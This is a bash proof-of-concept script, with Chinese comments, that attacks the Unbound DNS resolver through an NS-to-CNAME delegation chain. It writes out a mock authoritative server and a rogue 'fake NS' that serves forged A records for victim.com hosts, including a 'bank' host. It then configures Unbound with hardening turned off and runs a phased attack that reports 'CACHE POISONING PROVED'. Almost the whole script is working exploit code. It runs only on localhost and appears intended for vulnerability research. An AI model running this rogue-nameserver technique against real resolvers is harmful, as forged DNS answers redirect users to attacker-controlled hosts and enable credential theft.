#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning PoC v4
#  证明：Unbound 通过 NS→CNAME 解析链信任了攻击者区域返回的 IP，
#  将其作为合法 NS 地址使用，查询攻击者的 Fake NS，
#  缓存并返回伪造的解析结果。
#
#  策略：用 forward-zone + local-zone transparent 模拟委托
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test-v4"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3" 2>/dev/null || true
  pkill -f "unbound.*5353" 2>/dev/null || true
  sleep 1
}
kill_all

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning PoC v4                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# ═══ Auth server on 127.0.0.1:5355 ═══
cat > "$VDIR/auth_server.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v4/auth_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for label in name.rstrip('.').split('.'):
        if label: r += bytes([len(label)]) + label.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[AUTH] {from_ip}: {qname} {qtype}", flush=True)

ALL_ZONES = {}
# victim.com
ALL_ZONES[('victim.com', 6)] = [(300, enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400))]
ALL_ZONES[('victim.com', 2)] = [(300, enc('ns.victim.com.'))]
ALL_ZONES[('ns.victim.com', 5)] = [(300, enc('resolve.evil.com.'))]  # CNAME!
ALL_ZONES[('www.victim.com', 1)] = [(300, struct.pack('!I', 0x01020304))]   # A 1.2.3.4
ALL_ZONES[('mail.victim.com', 1)] = [(300, struct.pack('!I', 0x01020305))]
# evil.com
ALL_ZONES[('evil.com', 6)] = [(300, enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400))]
ALL_ZONES[('evil.com', 2)] = [(300, enc('ns.evil.com.'))]
ALL_ZONES[('ns.evil.com', 1)] = [(300, struct.pack('!I', 0x7f000001))]
ALL_ZONES[('resolve.evil.com', 1)] = [(300, struct.pack('!I', 0x7f000001))]  # A 127.0.0.1 → FAKE NS!
# safe.com (control)
ALL_ZONES[('safe.com', 6)] = [(300, enc('ns.safe.com.') + enc('admin.safe.com.') + struct.pack('!IIIII', 2026100905, 3600, 900, 604800, 86400))]
ALL_ZONES[('safe.com', 2)] = [(300, enc('ns.safe.com.'))]
ALL_ZONES[('ns.safe.com', 1)] = [(300, struct.pack('!I', 0x7f000002))]
ALL_ZONES[('www.safe.com', 1)] = [(300, struct.pack('!I', 0x05050505))]

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 5355))
print("[AUTH] Listening on 127.0.0.1:5355", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in ALL_ZONES:
            for ttl, rd in ALL_ZONES[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if qt != 5 and (qn, 5) in ALL_ZONES:
            for ttl, rd in ALL_ZONES[(qn, 5)]:
                answers.append((qname, 5, ttl, rd))
        if answers:
            flags_r = 0x8400
            hdr = struct.pack('!HHHHHH', txid, flags_r, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            for zone in ['victim.com','evil.com','safe.com']:
                if qn.endswith('.'+zone) or qn == zone:
                    soa = ALL_ZONES.get((zone,6),[(300,b'')])[0][1]
                    hdr = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
                    q = enc(qname) + struct.pack('!HH', qt, qc)
                    auth = enc_rr(zone, 6, qc, 300, soa)
                    sock.sendto(hdr + q + auth, addr)
                    break
            else:
                sock.sendto(struct.pack('!HHHHHH', txid, 0x8003, 1, 0, 0, 0) + enc(qname) + struct.pack('!HH', qt, qc), addr)
    except Exception as e:
        print(f"[AUTH] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# ═══ Fake NS on 127.0.0.1:53 ═══
cat > "$VDIR/fake_ns.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v4/fake_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[FAKE] {from_ip}: {qname} {qtype}  ← ATTACKER GOT QUERY!", flush=True)

FORGED = {
    ('victim.com', 6): [(300, enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400))],
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],
}

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] Listening on 127.0.0.1:53 — FORGED records", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in FORGED:
            for ttl, rd in FORGED[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if qt != 5 and (qn, 5) in FORGED:
            for ttl, rd in FORGED[(qn, 5)]:
                answers.append((qname, 5, ttl, rd))
        if answers:
            hdr = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            soa = FORGED[('victim.com', 6)][0][1]
            hdr = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            auth = enc_rr('victim.com', 6, qc, 300, soa)
            sock.sendto(hdr + q + auth, addr)
    except Exception as e:
        print(f"[FAKE] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# Start servers
> "$VDIR/auth_queries.jsonl" 2>/dev/null || true
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

python3 "$VDIR/auth_server.py" > "$VDIR/auth.log" 2>&1 &
AUTH_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

echo "  Servers: auth=$AUTH_PID, fake=$FAKE_PID"

# Verify
echo "  ns.victim.com CNAME → resolve.evil.com:"
dig @127.0.0.1 -p 5355 ns.victim.com A +time=3 +noall +answer 2>&1
echo "  resolve.evil.com A → 127.0.0.1 (fake NS):"
dig @127.0.0.1 -p 5355 resolve.evil.com A +time=3 +noall +answer 2>&1
echo "  www.victim.com A (legit):"
dig @127.0.0.1 -p 5355 www.victim.com A +time=3 +noall +answer 2>&1
echo "  www.victim.com A (FORGED from fake NS):"
dig @127.0.0.1 -p 53 www.victim.com A +time=3 +noall +answer 2>&1

# ═══ Unbound ═══
echo ""
echo "═══ Starting Unbound ═══"

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison-test-v4"
    pidfile: "/workspace/output/unbound-cache-poison-test-v4/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test-v4/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    local-zone: "victim.com" transparent
    local-zone: "safe.com" transparent

forward-zone:
    name: "victim.com"
    forward-addr: 127.0.0.1@5355
forward-zone:
    name: "evil.com"
    forward-addr: 127.0.0.1@5355
forward-zone:
    name: "safe.com"
    forward-addr: 127.0.0.1@5355

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 2

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID)"
else
  echo "  Unbound FAILED:"
  cat "$VDIR/unbound.log" | head -30
  kill_all; exit 1
fi

# ═══ ATTACK TEST ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK TEST                                                ║"
echo "╚══════════════════════════════════════════════════════════════╝"

python3 << 'PYEOF'
import socket, struct, time, json

def dns_query(name, qtype, port=5353, timeout=15):
    qname = b''
    for label in name.rstrip('.').split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    txid = 0xCAFE
    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
    question = qname + struct.pack('!HH', qtype, 1)
    pkt = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    start = time.monotonic()
    try:
        sock.sendto(pkt, ('127.0.0.1', port))
        data, _ = sock.recvfrom(4096)
        ms = (time.monotonic() - start) * 1000
        if len(data) >= 12:
            _, rflags, _, ancount = struct.unpack('!HHHH', data[:8])
            rcode = rflags & 0xF
            rc_map = {0:'NOERROR',1:'FORMERR',2:'SERVFAIL',3:'NXDOMAIN',4:'NOTIMP',5:'REFUSED'}
            ips = parse_ips(data)
            return rc_map.get(rcode, f'RC{rcode}'), ms, ancount, ips
        return 'ERR', ms, 0, []
    except socket.timeout:
        return 'TIMEOUT', (time.monotonic() - start) * 1000, 0, []
    finally:
        sock.close()

def parse_ips(data):
    if len(data) < 12: return []
    _, _, qdcount, ancount = struct.unpack('!HHHH', data[4:12])
    off = 12
    for _ in range(qdcount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        off += 4
    ips = []
    for _ in range(ancount):
        while off < len(data) and data[off] != 0:
            if data[off] & 0xC0 == 0xC0: off += 2; break
            off += 1 + data[off]
        else: off += 1
        if off + 10 > len(data): break
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[off:off+10])
        off += 10
        if off + rdlen > len(data): break
        if rtype == 1 and rdlen == 4:
            ip = '.'.join(str(b) for b in data[off:off+4])
            ips.append(ip)
        off += rdlen
    return ips

QT_A = 1

# ─── Phase 1: victim.com NS ───
print("  Phase 1: victim.com NS")
rcode, ms, ans, ips = dns_query("victim.com", 2, timeout=10)
print(f"    victim.com NS: {rcode} {ms:.1f}ms")
time.sleep(0.3)

# ─── Phase 2: Resolve ns.victim.com CNAME ───
print("  Phase 2: ns.victim.com A (CNAME chase)")
rcode, ms, ans, ips = dns_query("ns.victim.com", QT_A, timeout=10)
print(f"    ns.victim.com A: {rcode} {ms:.1f}ms IPs={ips}")
time.sleep(0.3)

# ─── Phase 3: resolve.evil.com A ───
print("  Phase 3: resolve.evil.com A (attacker's zone)")
rcode, ms, ans, ips = dns_query("resolve.evil.com", QT_A, timeout=10)
print(f"    resolve.evil.com A: {rcode} {ms:.1f}ms IPs={ips}")
time.sleep(0.3)

# ─── Phase 4: THE ATTACK — www.victim.com ───
FAKE_LOG = "/workspace/output/unbound-cache-poison-test-v4/fake_queries.jsonl"
open(FAKE_LOG, 'w').close()  # clear

print()
print("  Phase 4: www.victim.com A (should go to fake NS if CNAME followed)")
print("    Legitimate: 1.2.3.4  |  Forged: 6.6.6.6")
rcode, ms, ans, ips = dns_query("www.victim.com", QT_A, timeout=15)
print(f"    www.victim.com A: {rcode} {ms:.1f}ms IPs={ips}")

time.sleep(0.5)

POISONED = '6.6.6.6' in ips
LEGIT = '1.2.3.4' in ips

if POISONED:
    print()
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║  CACHE POISONING PROVED!                                    ║")
    print("  ║  Unbound returned FORGED 6.6.6.6 instead of 1.2.3.4       ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
elif LEGIT:
    print("    Unbound returned legitimate answer from forwarder")
elif rcode == 'SERVFAIL':
    print("    SERVFAIL")
else:
    print(f"    Result: {rcode}, IPs={ips}")

# ─── Phase 5: Control — safe.com ───
time.sleep(0.3)
print()
print("  Phase 5: Control — safe.com (no CNAME)")
rcode, ms, ans, ips = dns_query("www.safe.com", QT_A, timeout=10)
print(f"    www.safe.com A: {rcode} {ms:.1f}ms IPs={ips}")

# ─── Phase 6: Fake NS analysis ───
time.sleep(0.3)
fake_qs = []
with open(FAKE_LOG) as f:
    for line in f:
        if line.strip():
            fake_qs.append(json.loads(line))

print()
print(f"  Fake NS queries: {len(fake_qs)}")
for q in fake_qs:
    print(f"    {q['qname']:<30} {q['qtype']:<8}  ← UNAUTHORIZED!")

# ─── Save result ───
result = {
    'poisoned': POISONED,
    'www_victim_ips': ips if (POISONED or LEGIT) else [],
    'fake_ns_queries': len(fake_qs),
    'fake_ns_names': [q['qname'] for q in fake_qs],
}
with open('/workspace/output/unbound-cache-poison-test-v4/result.json', 'w') as f:
    json.dump(result, f, indent=2)

PYEOF

# ═══ Server logs ═══
echo ""
echo "═══ Auth server queries ═══"
cat "$VDIR/auth_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "═══ Unbound log (victim/evil resolution) ═══"
grep -i "victim\|evil\|cname\|resolve\|ns\.victim" "$VDIR/unbound.log" 2>/dev/null | head -40 || echo "  (none)"

echo ""
echo "═══ Unbound log (errors) ═══"
grep -i "servfail\|fail\|error\|exceed" "$VDIR/unbound.log" 2>/dev/null | head -10 || echo "  (none)"

# ═══ Result ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Result                                                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
cat "$VDIR/result.json" 2>/dev/null || echo "  (no result)"

kill_all
kill "$AUTH_PID" "$FAKE_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
